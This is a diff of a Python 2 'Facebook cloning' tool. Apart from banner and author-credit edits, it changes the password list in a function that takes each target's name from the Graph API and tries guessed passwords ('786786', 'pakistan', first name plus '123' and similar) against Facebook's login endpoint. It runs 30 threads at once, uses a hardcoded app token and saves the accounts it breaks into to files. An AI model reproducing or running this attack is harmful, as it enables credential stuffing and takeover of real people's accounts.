@@ -115,38 +115,38 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\033[1;96m•◈•───────────────•◈•\033[1;92mShuBhamg0sain\033[1;96m•◈•───────────────•◈•"
-jalan(' \033[1;92m	                                   ') 
-jalan('\033[1;97m                      :::!~!!!!!:.') 
-jalan('\033[1;97m                  .xUHWH!! !!?M88WHX:.') 
-jalan('\033[1;97m                .X*#M@$!!  !X!M$$$$$$WWx:.') 
-jalan('\033[1;97m               :!!!!!!?H! :!$!$$$$$$$$$$8X:') 
-jalan('\033[1;97m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:') 
-jalan('\033[1;97m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!') 
-jalan('\033[1;97m             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!') 
-jalan('\033[1;97m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!') 
-jalan('\033[1;91m               ~?WuxiW*`   `"#$$$$8!!!!??!!!') 
-jalan('\033[1;91m             :X- M$$$$       `"T#$T~!8$WUXU~') 
-jalan('\033[1;91m            :%`  ~#$$$m:        ~!~ ?$$$$$$') 
-jalan('\033[1;91m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"') 
-jalan('\033[1;97m.....   -~~\033[1;91m:<` !    ~?T#$$@@W@*?$$      /`') 
-jalan('\033[1;97mW$@@M!!! .!~~ \033[1;91m!!     .:XUW$W!~ `"~:    :') 
-jalan('\033[1;97m#"~~`.:x%`!!  \033[1;91m!H:   !WM$$$$Ti.: .!WUn+!`') 
-jalan('\033[1;97m:::~:!!`:X~ .:\033[1;92m ?H.!u "$$$B$$$!W:U!T$$M~') 
-jalan('\033[1;97m.~~   :X@!.-~   \033[1;92m?@WTWo("*$$$W$TH$! `') 
-jalan('\033[1;97mWi.~!X$?!-~    : \033[1;92m?$$$B$Wu("**$RM!') 
-jalan('\033[1;97m$R@i.~~ !     :   \033[1;92m~$$$$$B$$en:``     ') 
-jalan('\033[1;97m?MXT@Wx.~    :     \033[1;92m~"##*$$$$M~   ') 
-jalan('\033[1;47m                  \033[1;31mShuBhamg0sain                \033[1;0m     ') 
+jalan('\033[1;97m	                                    ')
+jalan('\033[1;97m                      :::!~!!!!!:. ')
+jalan('\033[1;97m                  .xUHWH!! !!?M88WHX:.')
+jalan('\033[1;97m                .X*#M@$!!  !X!M$$$$$$WWx:.')
+jalan('\033[1;97m               :!!!!!!?H! :!$!$$$$$$$$$$8X:')
+jalan('\033[1;97m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:')
+jalan('\033[1;97m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!')
+jalan('\033[1;91m             ~!~!!!! .: BLACK-KILLER$$$$RMM!')
+jalan('\033[1;97m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!')
+jalan('\033[1;97m               ~?WuxiW*`   `"#$$$$8!!!!??!!!')
+jalan('\033[1;97m             :X- M$$$$       `"T#$T~!8$WUXU~')
+jalan('\033[1;97m            :%`  ~#$$$m:        ~!~ ?$$$$$$')
+jalan('\033[1;97m          :!`.-   ~T$$$$8xx.  .xWW- ~""##*" ')
+jalan('\033[1;97m.....   -~~\033[1;91m:<` !    ~?T#$$@@W@*?$$      /`')
+jalan('\033[1;97mW$@@M!!! .!~~ \033[1;91m!!     .:XUW$W!~ `"~:    :')
+jalan('\033[1;97m#"~~`.:x%`!!  \033[1;91m!H:   !WM$$$$Ti.: .!WUn+!`')
+jalan('\033[1;97m:::~:!!`:X~ .:\033[1;92m ?H.!u "$$$B$$$!W:U!T$$M~')
+jalan('\033[1;97m.~~   :X@!.-~   \033[1;92m?@WTWo("*$$$W$TH$! `')
+jalan('\033[1;97mWi.~!X$?!-~    : \033[1;92m?$$$B$Wu("**$RM!')
+jalan('\033[1;97m$R@i.~~ !     :   \033[1;92m~$$$$$B$$en:``   ') 
+jalan('\033[1;97m?MXT@Wx.~    :     \033[1;92m~"##*$$$$M~   ')
+jalan('\033[1;47m                  \033[1;31mShuBhamg0sain             \033[1;0m')
+jalan('\x1b[1;93m--------------------------------------------------------------')
 jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 
 jalan('\033[1;91m      \033[1;91m ENTER TOOL USERNAME AND PASSWORD \033[1;0m     ') 
 jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 
-
 jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
 jalan("    \033[1;93m▇▇\033[1;95m       WellCome to fb-cloning-target  \033[1;93m▇▇")
 jalan("    \033[1;93m▇▇\033[1;91m              👇  AUTHOR  👇          \033[1;93m▇▇")
-jalan("    \033[1;93m▇▇\033[1;92m          This Tools Is Created By    \033[1;93m▇▇")
-jalan("    \033[1;93m▇▇\033[1;92m                ShuBhamg0sain         \033[1;93m▇▇")
-jalan("    \033[1;93m▇▇\033[1;92m       WhatsApp  Number 03000000000   \033[1;93m▇▇")
+jalan("    \033[1;93m▇▇\033[1;92m               ShuBhamg0sain          \033[1;93m▇▇")
+jalan("    \033[1;93m▇▇\033[1;92m          don't call me only text.    \033[1;93m▇▇")
+jalan("    \033[1;93m▇▇\033[1;92m       WhatsApp  Number 919557777030  \033[1;93m▇▇")
 jalan("    \033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
 
 CorrectUsername = "g0sain"
@@ -404,7 +404,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = b['first_name']+'123'
+			pass1 = '786786'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -418,7 +418,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = b['last_name']+'123'
+					pass2 = b['first_name']+'123'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -432,7 +432,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = '786786'
+							pass3 = b['last_name']+'123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -446,7 +446,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = '789508'
+									pass4 = 'pakistan'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -460,7 +460,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = '863055'
+											pass5 = b['last_name'] + b['first_name']+'123'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -474,7 +474,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = '789508'
+													pass6 = b['first_name'] + b['last_name']+'123'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -488,7 +488,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 										                                else:
-										                                  	pass7 = '750096'
+										                                  	pass7 = 'india123'
 										                                 	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 										                        	        q = json.load(data)
 										                                 	if 'access_token' in q:
@@ -506,7 +506,7 @@ def pilih_super():
          
         p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;96m•◈•───────────────•◈•\033[1;92mAMIR*BABER\033[1;96m•◈•───────────────•◈•"
+	print "\033[1;96m•◈•───────────────•◈•\033[1;92mBLACK-KILLER\033[1;96m•◈•───────────────•◈•"
 	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Complete \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Saved \033[1;91m: \033[1;97mout/super_cp.txt")
